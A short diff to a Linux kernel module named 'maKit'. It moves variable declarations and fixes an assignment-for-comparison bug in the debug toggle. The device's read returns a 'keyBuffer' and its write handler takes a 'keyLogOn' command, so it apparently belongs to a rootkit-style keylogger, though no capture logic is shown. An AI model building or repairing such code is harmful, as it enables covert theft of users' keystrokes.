@@ -165,11 +165,13 @@ int open_dev(struct inode *inode, struct file *filp){
 //read of device
 ssize_t read_dev(struct file *filp, char __user *buf, size_t count, 
 						loff_t *posPtr){
+	int key;
+	int result;
+	char* buffer;
 	if(debug == 1)
 		printk(KERN_ALERT "maKit: read_dev executed!\n");
-	int key = 0;
-	int result;
-	char* buffer = keyBuffer;
+	key = 0;
+	buffer = keyBuffer;
 	while(*buffer != '\0'){
 		key++;
 		buffer++;
@@ -203,8 +205,8 @@ static ssize_t write_dev(struct file *filp, const char *buff,
 			i++;
 		}
 		if(strcmp(commands, "debug") == 0){
-			if(debug = 0) debug = 1;
-			else	debug = 0;
+			if(debug == 0){ debug = 1;}
+			else{ debug = 0;}
 		}
 		if(strcmp(commands,"keyLogOn") == 0){
 			keyLogOn = 1;
